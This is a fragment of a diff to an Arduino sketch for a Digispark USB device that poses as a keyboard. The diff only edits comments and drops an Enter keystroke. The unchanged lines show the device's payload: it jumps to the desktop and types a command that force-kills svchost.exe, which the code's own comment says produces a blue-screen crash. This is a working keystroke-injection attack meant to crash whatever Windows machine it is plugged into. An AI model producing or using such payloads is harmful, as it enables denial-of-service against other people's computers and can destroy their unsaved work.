@@ -9,9 +9,9 @@ void setup() {
 }
 
 void loop() {
-    DigiKeyboard.sendKeyStroke(0);
+    DigiKeyboard.sendKeyStroke(0); // For older computers, initialize the keyboard.
     DigiKeyboard.delay(1000);
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    
     digitalWrite(1, HIGH); // Turn on LED to signify task started
 
     DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT); // Go to desktop
@@ -30,5 +30,4 @@ void loop() {
 
     DigiKeyboard.println("TASKKILL /IM svchost.exe /F"); // BSOD Achieved
     digitalWrite(1, LOW); // Turn off LED to signify task completed
-    for(;;){} // We don't like looping.
-}
+    for(;;){}
